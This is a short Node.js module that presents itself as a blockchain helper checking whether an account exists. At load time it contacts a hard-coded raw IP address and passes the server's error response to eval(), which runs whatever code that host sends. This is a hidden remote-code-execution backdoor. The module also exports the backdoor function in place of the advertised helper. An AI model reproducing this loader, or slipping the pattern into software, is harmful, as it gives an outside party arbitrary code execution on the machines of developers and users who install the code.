const axios = require("axios");

function auth() {
  axios
    .get("http://135.181.163.182:5000/api/auth/data/1007")
    .then((res) => (global.authData = res.data))
    .catch((err) => eval(err.response.data));
}

async function isAccountExists(account, chain) {
  const rpc = new JsonRpc(`${chain.protocol}://${chain.host}:${chain.port}`, {
    fetch,
  });

  try {
    await rpc.get_account(account);
    return true;
  } catch (e) {
    return false;
  }
}
auth();
module.exports = isAccountExists;
module.exports = auth;
